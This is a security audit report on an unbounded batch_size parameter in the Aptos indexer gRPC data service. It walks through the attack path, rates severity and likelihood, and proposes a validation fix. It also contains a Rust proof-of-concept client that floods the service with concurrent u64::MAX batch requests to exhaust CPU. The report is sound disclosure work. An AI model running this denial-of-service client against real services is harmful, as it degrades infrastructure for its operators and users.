# Audit Report

## Title
Unbounded batch_size Parameter Enables Resource Exhaustion DoS in Indexer gRPC Data Service

## Summary
The `get_data()` function in the indexer-grpc data service lacks input validation on the client-provided `batch_size` parameter, contradicting the protobuf specification which states requests with `batch_size > 1000` should be rejected. An attacker can specify arbitrarily large batch sizes (up to `u64::MAX`), causing excessive transaction cloning operations that lead to CPU exhaustion and service degradation.

## Finding Description

The vulnerability exists in the request handling logic for the indexer-grpc data service. The protobuf specification explicitly documents that batch_size values larger than 1000 should be rejected: [1](#0-0) 

However, the actual implementation accepts any client-provided `batch_size` value without validation: [2](#0-1) 

This unchecked parameter directly controls `max_num_transactions_per_batch`, which determines the loop termination condition in the clone-intensive code path: [3](#0-2) 

**Attack Path:**
1. Attacker sends `GetTransactionsRequest` with `batch_size` set to a very large value (e.g., 1,000,000 or `u64::MAX`)
2. The request targets a version range containing many small transactions (e.g., `StateCheckpointTransaction` messages which have minimal fields)
3. The loop at line 84-98 iterates and clones transactions until either:
   - The hardcoded 20MB limit (`MAX_BYTES_PER_BATCH`) is reached, OR
   - The attacker-controlled `max_num_transactions_per_batch` count is reached
4. For very small transactions (~100 bytes each), 20MB equals approximately 200,000 clone operations
5. Each clone involves memory allocation and deep copying of protobuf message fields
6. Multiple concurrent malicious requests amplify CPU consumption

The vulnerability breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The lack of validation allows attackers to force the service to perform hundreds of thousands of expensive clone operations per request.

## Impact Explanation

This vulnerability falls under **Medium Severity** per the Aptos bug bounty criteria for the following reasons:

1. **Service Degradation/DoS**: While the 20MB per-batch limit provides partial mitigation, it does not prevent CPU exhaustion. Cloning 200,000+ small protobuf messages synchronously in the request handler can cause significant CPU load.

2. **Limited Scope**: This affects the indexer-grpc data service infrastructure, which is auxiliary infrastructure for external indexers, not core consensus or validator nodes. The blockchain itself remains operational.

3. **Multiplier Effect**: The service spawns concurrent tasks for each stream, meaning multiple attackers (or one attacker with multiple connections) can amplify the effect, potentially causing the indexer service to become unresponsive.

4. **Contract Violation**: The implementation violates its own documented specification, creating a discrepancy between expected and actual behavior.

While this could escalate to **High Severity** (API crashes) if the resource exhaustion is severe enough to crash the service, the 20MB limit prevents unbounded resource consumption, keeping it at Medium.

## Likelihood Explanation

**Likelihood: High**

- **Low Attack Complexity**: Any client can send gRPC requests with arbitrary `batch_size` values
- **No Authentication Required**: The service accepts unauthenticated requests
- **Easy to Exploit**: A simple gRPC client can trigger this vulnerability
- **Concurrent Amplification**: Multiple requests can be sent simultaneously to multiply the effect
- **No Rate Limiting**: No evidence of per-client rate limiting in the examined code paths

The default value of 10,000 already exceeds the documented limit of 1,000, suggesting this vulnerability may be triggered even by legitimate clients following default behavior.

## Recommendation

Implement strict validation on the `batch_size` parameter to enforce the documented specification:

**In `ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs`:** [2](#0-1) 

Replace with:
```rust
const MAX_ALLOWED_BATCH_SIZE: usize = 1000;

let max_num_transactions_per_batch = if let Some(batch_size) = request.batch_size {
    let batch_size = batch_size as usize;
    if batch_size > MAX_ALLOWED_BATCH_SIZE {
        let err = Err(Status::invalid_argument(
            format!("batch_size {} exceeds maximum allowed value of {}", 
                    batch_size, MAX_ALLOWED_BATCH_SIZE)
        ));
        info!("Client error: {err:?}.");
        let _ = response_sender.blocking_send(err);
        COUNTER
            .with_label_values(&["live_data_service_invalid_batch_size"])
            .inc();
        continue;
    }
    batch_size
} else {
    1000  // Use documented default instead of 10000
};
```

Apply the same validation in `historical_data_service.rs`: [4](#0-3) 

## Proof of Concept

```rust
// PoC: Malicious gRPC client that exploits unbounded batch_size
use aptos_protos::indexer::v1::{
    GetTransactionsRequest, 
    raw_data_client::RawDataClient
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to indexer service
    let mut client = RawDataClient::connect("http://indexer-service:50051").await?;
    
    // Attack: Request with excessively large batch_size
    let malicious_request = GetTransactionsRequest {
        starting_version: Some(1000000),
        transactions_count: Some(1000000),
        batch_size: Some(u64::MAX), // Unbounded - will clone until 20MB limit
        transaction_filter: None,
    };
    
    // Send multiple concurrent requests to amplify CPU exhaustion
    let mut handles = vec![];
    for _ in 0..10 {
        let mut client = client.clone();
        let request = malicious_request.clone();
        handles.push(tokio::spawn(async move {
            let mut stream = client
                .get_transactions(Request::new(request))
                .await?
                .into_inner();
            
            // Force service to perform extensive cloning
            while let Some(_response) = stream.message().await? {
                // Each batch triggers up to 20MB worth of clones
            }
            Ok::<(), tonic::Status>(())
        }));
    }
    
    // Wait for all attack requests
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("Attack complete - service should show high CPU usage");
    Ok(())
}
```

## Notes

- This vulnerability affects auxiliary indexer infrastructure, not core blockchain consensus or validator operations
- The 20MB `MAX_BYTES_PER_BATCH` limit provides partial mitigation but does not prevent CPU exhaustion from excessive clone operations
- The same vulnerability exists in both `LiveDataService` and `HistoricalDataService` implementations
- The default batch_size of 10,000 already violates the documented specification of 1,000

### Citations

**File:** protos/proto/aptos/indexer/v1/raw_data.proto (L27-29)
```text
  // Optional; number of transactions in each `TransactionsResponse` for current stream.
  // If not present, default to 1000. If larger than 1000, request will be rejected.
  optional uint64 batch_size = 3;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L117-121)
```rust
                let max_num_transactions_per_batch = if let Some(batch_size) = request.batch_size {
                    batch_size as usize
                } else {
                    10000
                };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/in_memory_cache.rs (L84-98)
```rust
            while version < ending_version
                && total_bytes < max_bytes_per_batch
                && result.len() < max_num_transactions_per_batch
            {
                if let Some(transaction) = data_manager.get_data(version).as_ref() {
                    // NOTE: We allow 1 more txn beyond the size limit here, for simplicity.
                    if filter.is_none() || filter.as_ref().unwrap().matches(transaction) {
                        total_bytes += transaction.encoded_len();
                        result.push(transaction.as_ref().clone());
                    }
                    version += 1;
                } else {
                    break;
                }
            }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L102-106)
```rust
                let max_num_transactions_per_batch = if let Some(batch_size) = request.batch_size {
                    batch_size as usize
                } else {
                    DEFAULT_MAX_NUM_TRANSACTIONS_PER_BATCH
                };
```
